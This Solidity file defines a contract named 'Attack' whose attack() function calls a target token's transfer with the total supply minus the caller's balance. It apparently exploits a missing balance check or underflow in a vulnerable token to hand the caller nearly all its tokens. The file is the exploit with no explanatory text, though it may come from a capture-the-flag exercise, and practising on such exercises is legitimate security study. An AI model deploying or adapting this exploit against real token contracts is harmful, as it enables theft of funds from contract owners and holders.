//SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

interface IToken {
    function transfer(address _to, uint _value) external returns (bool);

    function balanceOf(address _owner) external view returns (uint256 balance);

    function totalSupply() external view returns (uint256);
}

contract Attack {
    IToken private immutable token;

    constructor(address addressContract) {
        token = IToken(addressContract);
    }

    function attack() public {
        uint totalSupply = token.totalSupply();
        uint balance = token.balanceOf(msg.sender);
        token.transfer(msg.sender, totalSupply - balance);
    }
}
